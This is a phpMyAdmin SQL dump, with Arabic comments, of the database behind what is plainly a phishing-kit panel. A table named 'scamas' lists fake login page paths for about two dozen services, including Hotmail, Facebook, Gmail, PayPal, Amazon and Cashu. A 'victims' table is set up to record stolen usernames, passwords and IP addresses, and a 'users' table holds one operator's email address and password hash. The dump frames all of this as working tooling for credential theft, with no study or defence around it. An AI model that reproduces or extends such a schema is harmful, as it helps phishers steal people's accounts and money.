-- phpMyAdmin SQL Dump
-- version 2.10.3
-- http://www.phpmyadmin.net
-- 
-- المزود: localhost
-- أنشئ في: 10 يونيو 2013 الساعة 18:01
-- إصدارة المزود: 6.0.4
--  PHP إصدارة: 6.0.0-dev

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

-- 
-- قاعدة البيانات: `pass`
-- 

-- --------------------------------------------------------

-- 
-- بنية الجدول `scamas`
-- 

CREATE TABLE `scamas` (
  `scama_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `scama_desc` varchar(255) NOT NULL,
  `scama_url` varchar(255) NOT NULL,
  `scama_url1` varchar(255) NOT NULL,
  `scama_url2` varchar(255) NOT NULL,
  `scama_url3` varchar(255) NOT NULL,
  `scama_photo` varchar(255) NOT NULL,
  `scama_dir` varchar(255) NOT NULL,
  PRIMARY KEY (`scama_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=48 ;

-- 
-- إرجاع أو إستيراد بيانات الجدول `scamas`
-- 

INSERT INTO `scamas` VALUES (1, 'Startimes', 'login/startimes2/f.aspx?t=', 'login/startimes2/f.aspx?member=aspx=', '', '', 'Logo/starttimes.png', 'Startimes');
INSERT INTO `scamas` VALUES (2, 'HotmaiL', 'login/hotmail/en/?i=', 'login/hotmail/ar/?i=', '', 'login/hotmail/fr/?i=', 'Logo/hotmail.bmp', 'Hotmail');
INSERT INTO `scamas` VALUES (3, 'Facebook', 'login/facebook/en/?i=', 'login/facebook/ar/?i=', 'login/facebook/is?i=', 'login/facebook/fr?i=', 'Logo/facebook.png', 'Facebook');
INSERT INTO `scamas` VALUES (4, 'Gmail', 'login/gmail/?i=', '', '', '', 'Logo/gmail.png', 'Gmail');
INSERT INTO `scamas` VALUES (5, 'Ahlamontada', 'login/Ahlamontada/?i=', '', '', '', 'Logo/ahla.gif', 'Ahlamontada');
INSERT INTO `scamas` VALUES (6, 'Skype', 'login/skype/?i=', '', '', '', 'Logo/skype.png', 'Skype');
INSERT INTO `scamas` VALUES (7, 'Yahoo', 'login/yahoo/?i=', '', '', '', 'Logo/base.png', 'Yahoo');
INSERT INTO `scamas` VALUES (8, 'Gamezer', 'login/Gamezer/?i=', '', '', '', 'Logo/gamezer.jpg', 'Gamezer');
INSERT INTO `scamas` VALUES (9, 'Cashu', 'login/Cashu/?i=', '', '', '', 'Logo/cashu.gif', 'Cashu');
INSERT INTO `scamas` VALUES (10, 'Myegy', 'login/Myegy/?i=', '', '', '', 'Logo/myey.gif', 'Myegy');
INSERT INTO `scamas` VALUES (11, '4shared', 'login/4shared/?i=', '', '', '', 'Logo/4shared.gif', '4shared');
INSERT INTO `scamas` VALUES (12, 'amazon', 'login/amazon/?i=', '', '', '', 'Logo/amazon.gif', 'amazon');
INSERT INTO `scamas` VALUES (13, 'poker', 'login/poker/?i=', '', '', '', 'Logo/poker.png', 'poker');
INSERT INTO `scamas` VALUES (14, 'Jawaker', 'login/jawaker/?i=', '', '', '', 'Logo/jawaker.png', 'Jawaker');
INSERT INTO `scamas` VALUES (15, 'Twitter', 'login/twitter/?i=', '', '', '', 'Logo/twit.png', 'Twitter');
INSERT INTO `scamas` VALUES (16, 'xat', 'login/xat/?i=', '', '', '', 'Logo/xatblk.gif', 'xat');
INSERT INTO `scamas` VALUES (17, 'myspace', 'login/myspace/?i=', '', '', '', 'Logo/myspace.png', 'myspace');
INSERT INTO `scamas` VALUES (18, 'nimbuzz', 'login/nimbuzz/?i=', '', '', '', 'Logo/nimbuzz.png', 'nimbuzz');
INSERT INTO `scamas` VALUES (19, 'Youtube', 'login/youtube/?i=', '', '', '', 'Logo/youtube.png', 'Youtube');
INSERT INTO `scamas` VALUES (20, 'Skyrock', 'login/skyrock/?i=', '', '', '', 'Logo/rock.PNG', 'Skyrock');
INSERT INTO `scamas` VALUES (21, 'Habbo', 'login/Habbo/?i=', '', '', '', 'Logo/habbo.png', 'Habbo');
INSERT INTO `scamas` VALUES (22, 'megaupload', 'login/megaupload/?i=', '', '', '', 'Logo/megaupload.png', 'megaupload');
INSERT INTO `scamas` VALUES (23, 'megavideo', 'login/megavideo/?i=', '', '', '', 'Logo/megavideo.png.gif', 'megavideo');
INSERT INTO `scamas` VALUES (24, 'Paypal', 'login/paypal/?i=', '', '', '', 'Logo/paypal.png', 'Paypal');

-- --------------------------------------------------------

-- 
-- بنية الجدول `users`
-- 

CREATE TABLE `users` (
  `user_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `user_name` varchar(255) NOT NULL,
  `user_password` varchar(255) NOT NULL,
  `user_email` varchar(255) NOT NULL,
  `user_contry` varchar(255) NOT NULL,
  `user_date_register` int(11) NOT NULL,
  `user_age` int(11) NOT NULL,
  `user_level` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`user_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=76 ;

-- 
-- إرجاع أو إستيراد بيانات الجدول `users`
-- 

INSERT INTO `users` VALUES (1, 'arabezy', '6ad4664ba23eac71b5ef5e826ea0c6cd', 'arabezy@hotmail.com', '', 1370882544, 22, 2);

-- --------------------------------------------------------

-- 
-- بنية الجدول `victims`
-- 

CREATE TABLE `victims` (
  `victime_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `victime_user` varchar(255) NOT NULL,
  `victime_password` varchar(255) NOT NULL,
  `victime_date` int(11) NOT NULL,
  `victime_ip` varchar(255) NOT NULL,
  `victime_user_id` int(11) NOT NULL,
  `victime_scama` int(11) NOT NULL,
  `victime_is_new` int(11) NOT NULL DEFAULT '1',
  `victime_deleted` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`victime_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=367 ;

-- 
-- إرجاع أو إستيراد بيانات الجدول `victims`
-- 

